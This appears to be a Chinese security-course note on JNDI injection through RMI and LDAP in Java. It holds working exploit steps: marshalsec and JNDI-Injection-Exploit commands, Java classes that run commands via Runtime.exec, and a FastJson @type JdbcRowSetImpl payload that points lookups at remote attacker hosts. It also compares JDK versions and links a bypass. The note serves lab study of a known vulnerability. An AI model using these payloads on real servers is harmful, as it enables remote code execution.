# JavaEE应用&JNDI注入&RMI服务&LDAP服务&JDK绕过&调用链类

## 思考

什么是jndi注入？

为什么有jndi注入？

JDNI注入安全问题？

JDNI注入利用条件？



<img src="https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/image-20251023161019455.png" alt="image-20251023161019455" style="zoom: 80%;" />



> JNDI全称为Java Naming and DirectoryInterface（ Java 命名和目录接口），是一组应用程序接口，为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定义用户、网络、机器、对象和服务等各种资源。JNDI支持的服务主要有：DNS、LDAP、CORBA、RMI等。
>
> RMI：远程方法调用注册表
>
> LDAP：轻量级目录访问协议

### 调用检索

调用检索：

Java为了将Object对象存储在Naming或 Directory服务下，提供了 Naming Reference 功能，对象可以通过绑定Reference存储在Naming或 Directory服务下，比如RMI 、LDAP等。 

**javax.naming.InitialContext.lookup()**

在 RMI 服务中调用了 InitialContext.lookup() 的类有：

**org.springframework.transaction.jta.JtaTransactionManager.readObject()**

**com.sun.rowset.JdbcRowSetImpl.execute()**

**javax.management.remote.rmi.RMIConnector.connect()**

**org.hibernate.jmx.StatisticsService.setSessionFactoryJNDINa me(String sfJNDIName)**

不止这些，可以自行查询。

在LDAP服务中调用了 InitialContext.lookup() 的类有：

**InitialDirContext.lookup()**

**Spring LdapTemplate.lookup()**

**LdapTemplate.lookupContext()**

## JNDI 注入-RMI&LDAP 服务

创建项目，之后再创建JndiDemo，代码如下：

```java
package org.example.jndiinjectdemo;

import javax.naming.InitialContext;
import javax.naming.NamingException;

public class JndiDemo {
    public static void main(String[] args) throws NamingException {
        // 创建一个rmi ldap等服务调用  实例化对象
        InitialContext ic = new InitialContext();
        // 调用rmi ldap等服务对象类(远程服务)
        //ldap://47.243.198.220:1389/5le86y = 远程地址的一个class文件被执行
        //ic.lookup("ldap://47.243.198.220:1389/5le86y");
        ic.lookup("rmi://47.243.198.220:1099/5le86y");
    }
}
```

### JNDI远程调用JNDI-Injection

这里就展示参考文档中的部分了，和上次的内容差不了多少。

使用Xshell连接，输入以下命令

```shell
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "calc" -A IP地址
```

**使用Ldap连接（默认端口1389）**

<img src="https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/5dd35a7f89df474f9c92ee0b2c920031.png" alt="img" style="zoom:50%;" />

**使用rmi连接（默认端口1099）**

<img src="https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/cbd6a1750076480381f18542c0d69958.png" alt="img" style="zoom:50%;" />

### JNDI远程调用-marshalsec

1. 使用远程调用 ( 默认端口 1389 )

   new InitialContext().lookup("ldap://xx.xx.xx.xx:1389/Test");

   new InitialContext().lookup("rmi://xx.xx.xx.xx:1099/Test");

2. 编译调用对象

   javac Test.java

3. 使用利用工具生成调用协议（rmi,ldap）

   java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://0.0.0.0/#Test

   java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://0.0.0.0/#Test

4. 将生成的Class存放访问路径

后续步骤就是再创建一个Jndi的项目，新建Test.java，代码如下：

```java
import java.io.IOException;
 
public class Test {
    public Test() throws IOException {
        Runtime.getRuntime().exec("notepad");
    }
}
```

再就是生成class文件，在终端执行：

```shell
cd .\src\main\java\
 
 javac .\Test.java  
 
 ls
```

完成之后将文件放到服务器中，可以用`url+路径/文件名`的方式来确定文件是否正确上传或者上传到目标位置。

在项目中新建Ldap.java，代码如下：

```java
import javax.naming.InitialContext;
 
public class ldap {
    public static void main(String[] args) throws Exception{
 
        // 创建一个rmi ldap等服务调用 实例化对象
        //new InitialContext().lookup("rmi://47.94.236.117:1099/Test");
        // 调用rmi ldap等服务对象类（远程服务）
        //ldap://47.94.236.117:1389/nx5qkh =  远程地址的一个class文件被执行
        //ini.lookup("ldap://47.94.236.117:1389/nx5qkh");
 
        //new InitialContext().lookup("ldap://localhost:1389/Calc");
        // 进行访问
        new InitialContext().lookup("ldap://47.94.236.117:1389/Test");
        //new InitialContext().lookup("ldap://47.94.236.117:1389/Test");
 
 
    }
}
```

使用xshell运行：

```shell
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://0.0.0.0/#Test
http://0.0.0.0/#Test 
0.0.0.0是默认的端口此处可以改为ip地址/#这里是文件名
```

后面内容就是修改版本做测试了。

|  比较  | LDAP - marshalsec工具 | RMI marshalsec工具 | LDAP - jndi-inject工具 | RMI jndi-inject工具 |
| :----: | :-------------------: | :----------------: | :--------------------: | :-----------------: |
| JDK 17 |         可以          |      无法调用      |        无法调用        |      无法调用       |
| 11版本 |         可以          |      无法调用      |        无法调用        |      无法调用       |
| 8u362  |         可以          |      无法执行      |        无法执行        |      无法执行       |
| 8U112  |         可以          |        可以        |          可以          |        可以         |

<img src="https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/3701.png" style="zoom:80%;" />

JDK 6u45、7u21之后：

java.rmi.server.useCodebaseOnly的默认值被设置为true。当该值为true时，

将禁用自动加载远程类文件，仅从CLASSPATH和当前JVM的java.rmi.server.codebase指定路径加载类文件。

使用这个属性来防止客户端VM从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。

JDK 6u141、7u131、8u121之后：

增加了com.sun.jndi.rmi.object.trustURLCodebase选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项，因此RMI和CORBA在以上的JDK版本上已经无法触发该漏洞，但依然可以通过指定URI为LDAP协议来进行JNDI注入攻击。

JDK 6u211、7u201、8u191之后：

增加了com.sun.jndi.ldap.object.trustURLCodebase选项，默认为false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。

高版本绕过：

https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html

### JNDI-Injection & marshalsec 实现原理

> RMI调用
>
> bind：将名称绑定到对象中；
>
> lookup：通过名字检索执行的对象；
>
> Reference类表示对存在于命名/目录系统以外的对象的引用。
>
> Reference参数：
>
> className：远程加载时所使用的类名；
>
> classFactory：加载的class中需要实例化类的名称；
>
> classFactoryLocation：远程加载类的地址，提供classes数据的地址可以是file/ftp/http等协议；

Registry首先启动，并监听一个端口，一般是1099：

```java
Registry registry = LocateRegistry.createRegistry(1099);
```

在这里，createRegistry(1099) 方法启动 RMI 注册表，并监听在端口 1099 上。

Server向Registry注册远程对象：

```java
Reference reference = new Reference("Calc", "Calc", "http://localhost/");
ReferenceWrapper wrapper = new ReferenceWrapper(reference);
registry.bind("calc", wrapper);
```

服务器创建一个 Reference 对象，包含用于远程加载的类信息，然后将该 Reference 对象包装成 ReferenceWrapper，最后通过 registry.bind 注册到 RMI 注册表中，使用名字 “calc”。

Client从Registry获取远程对象的代理：

```java
Object remoteObject = context.lookup("rmi://47.94.236.117:1099/calc");
```

客户端获取 RMI 注册表的上下文，并通过 lookup 方法查找名为 “calc” 的远程对象，返回其代理。

Client通过这个代理调用远程对象的方法：

```java
// 可以将返回的 remoteObject 转换为具体的远程接口类型，然后调用远程方法
// 例如：CalcInterface calc = (CalcInterface) remoteObject;
// 远程方法调用示例
// 例如：calc.performCalculation();
```

客户端通过获得的代理对象调用远程对象的方法。

Server端的代理接收到Client端调用的方法，参数，Server端执行相对应的方法：

在服务器端，RMI 框架接收到客户端调用的方法、参数等信息，并通过相应的远程对象执行对应的方法。

Server端的代理将执行结果返回给Client端代理：

执行结果将通过 RMI 框架返回给客户端的代理对象，使客户端能够获取到远程方法的执行结果。

```java
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.Reference;
import java.rmi.server.ReferenceWrapper;
 
public class RMIServer {
 
    public static void main(String[] args) throws Exception {
        // 创建 RMI 注册表并监听在 1099 端口上
        Registry registry = LocateRegistry.createRegistry(1099);
 
        **// 创建一个包含类信息的 Reference 对象
        // className: 远程加载时所使用的类名
        // classFactory: 加载的类中需要实例化的类的名称
        // classFactoryLocation: 远程加载类的地址，提供 classes 数据的地址可以是 file/ftp/http 等协议
        Reference reference = new Reference("Calc", "Calc", "http://localhost/");**
 
        // 使用 Reference 对象创建 ReferenceWrapper 对象
        ReferenceWrapper wrapper = new ReferenceWrapper(reference);
 
        // 将包装后的 Reference 对象绑定到 RMI 注册表上，使用名字 "calc"
        registry.bind("calc", wrapper);
    }
}
```

```java
import java.lang.Runtime;
 
public class Calc {
    public Calc() throws Exception{
        Runtime.getRuntime().exec("mstsc");
    }
}
```

**ldap总代码及总结**

```java
import javax.naming.InitialContext;
 
public class ldap {
    public static void main(String[] args) throws Exception{
 
        //1.jndi - rmi ldap服务
        //2.rmi ldap 都可以进行远程调用对象 可以远程执行java代码class文件
        //3.攻击利用中就用到了jndi-inject项目和marshalsec
        //3.1发现 jdk高版本会影响rmi和ldap的利用（marshalsec针对ldap有高版本绕过方法）
        //4.1 利用要知道其他类也能调用jndi注入（rmi,ldap）
 
        //创建一个rmi ldap等服务调用 实例化对象
        //new InitialContext().lookup("rmi://47.94.236.117:1099/Test");
        //调用rmi ldap等服务对象类（远程服务）
        //ldap://47.94.236.117:1389/nx5qkh =  远程地址的一个class文件被执行
        //ini.lookup("ldap://47.94.236.117:1389/nx5qkh");
 
        //new InitialContext().lookup("ldap://localhost:1389/Calc");
        //new InitialContext().lookup("ldap://47.94.236.117:1389/Test");
 
        //RMI marshalsec工具
        //JDK 17版本 无法调用
        //11版本无法调用
        // 8u362 无法执行
        // 8U112 可以
 
        //RMI jndi-inject工具
        //JDK 17版本 无法调用
        //11版本无法调用
        // 8u362 无法执行
        // 8U112 可以
        //new InitialContext().lookup("rmi://47.94.236.117:1099/Test");
 
        //LDAP  - marshalsec工具
        //JDK 17
        // 11版本
        // 8u362
        // 8U112 都可以
 
        //LDAP  - jndi-inject工具
        //JDK 17版本 无法调用
        //11版本无法调用
        // 8u362 无法执行
        // 8U112 可以
        new InitialContext().lookup("ldap://47.94.236.117:1389/awvmkm");
        
    }
}
```

1. jndi - rmi ldap服务

2. rmi ldap 都可以进行远程调用对象 可以远程执行java代码class文件

3. 攻击利用中就用到了jndi-inject项目和marshalsec

   发现 jdk高版本会影响rmi和ldap的利用（marshalsec针对ldap有高版本绕过方法）

4. 利用要知道其他类也能调用jndi注入（rmi,ldap）

## JNDI注入-FastJson漏洞结合

背景：JavaEE中接受用户提交的JSON数据进行转换(FastJson反序列化漏洞)

思路：利用InitialContext.lookup()中的进行JdbcRowSetImpl类JNDI服务注入

漏洞利用：**FastJson autotype处理Json对象的时候，未对@type字段进行完整的安全性验证，攻击者可以传入危险类**，并调用危险类连接远程RMI主机，通过其中的恶意类执行代码。攻击者通过这种方式可以实现远程代码执行漏洞，获取服务器敏感信息，甚至可以利用此漏洞进一步的对服务器数据进行操作。

参考文章：https://blog.csdn.net/weixin_49150931/article/details/126056687

创建项目，在pom.xml中添加依赖项fastjson，之后新建类，代码如下：

```java
package org.example.fastjsondi;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;

import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

@WebServlet("/json")
public class FjWeb extends HttpServlet {
    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse res) {
        String jsondata = req.getParameter("jsondata");
        System.out.println(jsondata);
        JSONObject jo = JSON.parseObject(jsondata);
        System.out.println(jo);
    }
}
```

修改index.jsp，代码如下：

```jsp
<%@ page contentType="text/html; charset=UTF-8" pageEncoding="UTF-8" %>
<!DOCTYPE html>
<html>
<head>
    <title>JSP - Hello World</title>
</head>
<body>
<h1><%= "Hello World!" %>
</h1>
<br/>
<a href="hello-servlet">Hello Servlet</a>

<form action="http://localhost:8080/FastJsonDi_war_exploded/json" method="post">
    Please input jsondata:<input type="text" name="jsondata">
    <input type="submit" value="提交">
</form>

</body>
</html>
```

#### 漏洞利用尝试

直接把构造的payload填至输入框。

```html
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://47.83.186.173:1389/ejzqto","autoCommit":true}
```

成功后就是这个样子：

<img src="https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/1dc8deb680c84c558c536092aaa5bcd5.png" alt="img" style="zoom:50%;" />

#### 黑盒你怎么知道fastjson?所以利用漏洞poc

在500状态栏中有fastjson：

<img src="https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/0a257c3625074776a0e8379bbbc327e5.png" alt="img"  />

在发送数据时为json数据：

![img](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/b1994780d20c4d848a6224e4aed90200.png)

#### 白盒知道fastjson,那poc为什么那样写?

和上节课相同

![image-20251023205503082](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/image-20251023205503082.png)

关键点在这里，在`@Type`这里可以进行对调用类的修改。反序列化时进行转换。

#### 为什么可以在com.sun.rowset.JdbcRowSetImpl中使用lookup？

[跳转到调用检索部分](#调用检索)

#### 不同版本jdk8u_362

```java
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://47.83.186.173:1389/Test","autoCommit":true}
```

接收到了但没有反应，因为和fastjson逻辑还是不符合。

<img src="https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/a269126e5bad422883a51928cb89db90.png" alt="img" style="zoom: 50%;" />

#### 总结

![img](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/47a2a638ae8141a2bd6e547d76accb59.png)